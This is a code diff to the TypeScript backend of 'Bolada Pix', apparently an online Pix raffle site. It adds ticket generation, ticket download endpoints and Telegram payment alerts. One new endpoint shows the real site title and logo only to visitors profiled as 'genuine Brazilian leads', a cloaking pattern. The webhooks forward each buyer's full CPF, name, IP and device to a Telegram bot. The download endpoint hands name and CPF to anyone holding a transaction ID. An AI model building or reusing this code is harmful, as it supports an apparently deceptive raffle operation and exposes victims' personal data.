@@ -8,6 +8,8 @@ import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS } from "./lib/sec
 import { extractLeadProfile } from "./lib/lead-profiler";
 import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
 import { getSecret } from "./lib/vault-shield";
+import { generateEncryptedTickets, formatTicketsAsTxt, type GeneratedTicket } from "./lib/ticket-generator";
+import { decryptRouteParam } from "./lib/crypto-routes";
 
 type ServerEntry = {
   fetch: (request: Request, env: unknown, ctx: unknown) => Promise<Response> | Response;
@@ -72,6 +74,88 @@ export default {
       return new Response(JSON.stringify({ error: securityCheck.reason }), {
         status: 403,
         headers: { "Content-Type": "application/json", ...MILITARY_SECURITY_HEADERS },
+      });
+    }
+
+    // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
+    if (url.pathname === "/api/validate-lead" && request.method === "POST") {
+      const profile = extractLeadProfile(request, clientIp);
+      const isGenuine = profile.validation.isGenuineBrazilian;
+
+      return new Response(
+        JSON.stringify({
+          valid: isGenuine,
+          score: profile.validation.score,
+          city: profile.city,
+          state: profile.state,
+          country: profile.country,
+          // Se validado, libera o payload descriptografado do título e do favicon
+          title: isGenuine ? "Bolada Pix — Prêmios incríveis" : "Carregando...",
+          icon: isGenuine ? "/assets/logo.webp" : "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>",
+        }),
+        {
+          headers: {
+            "Content-Type": "application/json",
+            "Cache-Control": "no-store",
+            ...MILITARY_SECURITY_HEADERS,
+          },
+        }
+      );
+    }
+
+    // 1.2 Endpoint para consulta e verificação de bilhetes gerados
+    if (url.pathname === "/api/tickets/status" && request.method === "GET") {
+      const txId = url.searchParams.get("txId") || "";
+      const leadRecord = getTransactionLead(txId);
+      const tickets = (leadRecord?.lead as unknown as { tickets?: GeneratedTicket[] })?.tickets || [];
+
+      return new Response(
+        JSON.stringify({
+          txId,
+          hasTickets: tickets.length > 0,
+          count: tickets.length,
+          tickets: tickets.map((t) => ({ code: t.code, hash: t.hashToken })),
+        }),
+        {
+          headers: {
+            "Content-Type": "application/json",
+            ...MILITARY_SECURITY_HEADERS,
+          },
+        }
+      );
+    }
+
+    // 1.3 Endpoint para download dos bilhetes em arquivo .TXT oficial
+    if (url.pathname === "/api/tickets/download" && request.method === "GET") {
+      const txId = url.searchParams.get("txId") || "";
+      const leadRecord = getTransactionLead(txId);
+      const leadData = leadRecord?.lead as unknown as { tickets?: GeneratedTicket[]; name?: string; cpf?: string };
+      const tickets = leadData?.tickets || [];
+      const config = getRifaConfig();
+
+      if (tickets.length === 0) {
+        return new Response("Nenhum bilhete confirmado encontrado para esta transação.", {
+          status: 404,
+          headers: { "Content-Type": "text/plain; charset=utf-8" },
+        });
+      }
+
+      const txtContent = formatTicketsAsTxt({
+        edition: config.edition,
+        txId,
+        payerName: leadData?.name,
+        payerDocument: leadData?.cpf,
+        drawDate: `${config.drawDate} às ${config.drawTime}`,
+        tickets,
+      });
+
+      return new Response(txtContent, {
+        headers: {
+          "Content-Type": "text/plain; charset=utf-8",
+          "Content-Disposition": `attachment; filename="bolada_pix_bilhetes_${txId.substring(0, 10)}.txt"`,
+          "Cache-Control": "no-store",
+          ...MILITARY_SECURITY_HEADERS,
+        },
       });
     }
 
@@ -293,6 +377,17 @@ export default {
         const netCalc = PaymentManager.calculateNet(amount, "União 7 Pay");
         const leadRecord = getTransactionLead(txId);
         const lead = leadRecord?.lead;
+        const config = getRifaConfig();
+
+        // Quantidade de cotas compradas
+        const unitPrice = config.ticketPrice || 0.69;
+        const ticketQty = Math.max(1, Math.round(amount / unitPrice));
+
+        // Geração dos códigos de 6 dígitos criptografados com CSPRNG e HMAC
+        const tickets = generateEncryptedTickets(ticketQty, txId);
+        if (lead) {
+          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
+        }
 
         logActivity({
           type: "pagamento_confirmado",
@@ -302,6 +397,8 @@ export default {
             txId: txId,
             provider: "União 7 Pay",
             cpf: lead?.cpf,
+            rifas: ticketQty,
+            tickets: tickets.map((t) => t.code),
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -310,6 +407,8 @@ export default {
 
         const timeStr = new Date().toLocaleTimeString("pt-BR");
         const dateStr = new Date().toLocaleDateString("pt-BR");
+        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
+          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");
 
         await sendTelegramNotification(
           `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
@@ -317,6 +416,9 @@ export default {
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
           `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
           `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
+          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
+          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
+          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
           `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
           `• <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
           `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
@@ -324,7 +426,15 @@ export default {
           `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
           `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
           `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
-          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`
+          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
+          {
+            replyMarkup: {
+              inline_keyboard: [
+                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
+                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
+              ],
+            },
+          }
         );
       }
       return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
@@ -338,6 +448,14 @@ export default {
         const netCalc = PaymentManager.calculateNet(amount, "Elite PAYbr");
         const leadRecord = getTransactionLead(txId);
         const lead = leadRecord?.lead;
+        const config = getRifaConfig();
+
+        const unitPrice = config.ticketPrice || 0.69;
+        const ticketQty = Math.max(1, Math.round(amount / unitPrice));
+        const tickets = generateEncryptedTickets(ticketQty, txId);
+        if (lead) {
+          (lead as unknown as { tickets?: GeneratedTicket[] }).tickets = tickets;
+        }
 
         logActivity({
           type: "pagamento_confirmado",
@@ -347,6 +465,8 @@ export default {
             txId: txId,
             provider: "Elite PAYbr",
             cpf: lead?.cpf,
+            rifas: ticketQty,
+            tickets: tickets.map((t) => t.code),
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -355,6 +475,8 @@ export default {
 
         const timeStr = new Date().toLocaleTimeString("pt-BR");
         const dateStr = new Date().toLocaleDateString("pt-BR");
+        const ticketsSample = tickets.slice(0, 10).map((t) => `<code>${t.code}</code>`).join(", ") +
+          (tickets.length > 10 ? ` <i>(+${tickets.length - 10} gerados)</i>` : "");
 
         await sendTelegramNotification(
           `🎉 <b>COMPRA CONCLUÍDA E PAGA COM SUCESSO!</b>\n\n` +
@@ -362,6 +484,9 @@ export default {
           `💰 <b>Valor Pago:</b> R$ ${amount.toFixed(2).replace(".", ",")}\n` +
           `📉 <b>Taxa Descontada:</b> R$ ${netCalc.fee.toFixed(2).replace(".", ",")}\n` +
           `💵 <b>VALOR LÍQUIDO DO ADMIN:</b> <b>R$ ${netCalc.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
+          `🎟️ <b>COTAS GERADAS (6 DÍGITOS CRIPTOGRAFADOS):</b>\n` +
+          `• <b>Quantidade:</b> ${tickets.length} cotas\n` +
+          `• <b>Códigos:</b> ${ticketsSample}\n\n` +
           `👤 <b>RESUMO COMPLETO DO LEAD:</b>\n` +
           `• <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
           `• <b>CPF Completo:</b> <code>${lead?.cpf || "Identificado no Checkout"}</code>\n` +
@@ -369,7 +494,15 @@ export default {
           `• <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
           `• <b>IP Completo:</b> <code>${lead?.ip || clientIp}</code>\n` +
           `📅 <b>Data e Hora da Aprovação:</b> <code>${dateStr} às ${timeStr}</code>\n` +
-          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`
+          `🆔 <b>ID da Transação:</b> <code>${txId}</code>`,
+          {
+            replyMarkup: {
+              inline_keyboard: [
+                [{ text: `🚫 Banir este Lead (IP: ${lead?.ip || clientIp})`, callback_data: `action:ban:${lead?.ip || clientIp}` }],
+                [{ text: "👥 Ver Lista de Leads", callback_data: "action:leads_list" }],
+              ],
+            },
+          }
         );
       }
       return new Response(JSON.stringify({ received: true }), { headers: { "Content-Type": "application/json" } });
